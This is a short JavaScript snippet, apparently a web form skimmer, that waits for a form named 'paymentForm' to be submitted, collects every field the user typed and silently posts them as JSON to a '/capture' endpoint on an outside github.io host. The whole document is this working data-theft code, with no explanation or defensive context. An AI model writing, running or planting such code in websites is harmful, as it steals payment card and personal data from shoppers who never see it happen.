document.addEventListener('DOMContentLoaded', function() {
    var form = document.querySelector('form[name="paymentForm"]');
    if (form) {
        form.addEventListener('submit', function(event) {
            var formData = new FormData(form);
            var data = {};
            formData.forEach(function(value, key) {
                data[key] = value;
            });
            fetch('https://hamzycode.github.io/capture', {
                method: 'POST',
                body: JSON.stringify(data),
                headers: {
                    'Content-Type': 'application/json'
                }
            });
        });
    }
});